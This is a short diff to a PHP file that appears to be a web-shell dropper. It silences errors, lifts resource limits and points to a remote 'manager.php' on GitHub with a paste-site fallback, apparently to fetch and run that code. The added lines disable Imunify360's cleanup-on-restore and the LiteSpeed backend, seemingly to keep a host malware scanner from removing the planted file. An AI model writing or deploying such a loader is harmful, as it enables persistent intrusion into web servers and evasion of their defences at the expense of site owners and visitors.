@@ -1,9 +1,12 @@
 <?php
-
+ini_set('lsapi_backend_off', '1');
+ini_set("imunify360.cleanup_on_restore", false);
 error_reporting(0);
 @ini_set('display_errors', '0');
 @ini_set('memory_limit', '512M');
 @set_time_limit(180);
+@ini_set('lsapi_backend_off', '1');
+@ini_set("imunify360.cleanup_on_restore", false);
 
 $u = 'https://raw.githubusercontent.com/tangsel1928/alfa/refs/heads/main/manager.php';
 $uFb = 'https://paste.myconan.net/677980.txt';
